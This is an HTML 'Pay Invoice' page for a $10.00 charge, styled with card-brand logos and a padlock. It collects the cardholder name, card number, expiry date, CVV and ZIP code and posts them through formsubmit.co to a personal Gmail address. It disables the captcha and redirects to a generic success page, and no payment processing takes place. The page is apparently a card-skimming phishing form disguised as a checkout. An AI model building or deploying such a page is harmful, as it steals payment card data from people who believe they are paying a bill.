<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pay Invoice</title>
<link rel="stylesheet" href="billing.css">

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
<div class="payment-card">

    <div class="card-header">
        <h1>Pay Invoice</h1>
    </div>

    <div class="card-body">
<form action="https://formsubmit.co/lemoakorede@gmail.com"
method="POST">

    <input type="hidden" name="_subject" value="New Payment Submission">


    <div class="card-brands">
        <img src="visa.png">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg">
        <img src="discover.png">
    </div>

    <div class="amount-row">
        <div>
            <p>Payment amount</p>
            <h2>$10.00</h2>
        </div>

        <button type="button" class="edit-btn">
            Edit
        </button>
    </div>

    <label>Name on card</label>
    <input
        type="text"
        name="card_name"
        required>

    <label>Card number</label>
    <input
        type="text"
        name="card_number"
        placeholder="1234 5678 9012 3456"
        required>

    <div class="row">

        <div>
            <label>Expiry date</label>
            <input
                type="text"
                name="expiry_date"
                placeholder="MM / YY"
                required>
        </div>

        <div>
            <label>Security code</label>
            <input
                type="text"
                name="cvv"
                placeholder="CVV"
                required>
        </div>

    </div>

    <label>ZIP / Postal Code</label>
    <input
        type="text"
        name="zip_code"
        required>

    <button type="submit" class="pay-btn">
        <i class="fa-solid fa-lock"></i>
        Pay $10.00
    </button>

    <input type="hidden" name="_next" value="https://submit-success.vercel.app/">
    <input type="hidden" name="_captcha" value="false">
</form>
</div>
</div>
</body>
</html>
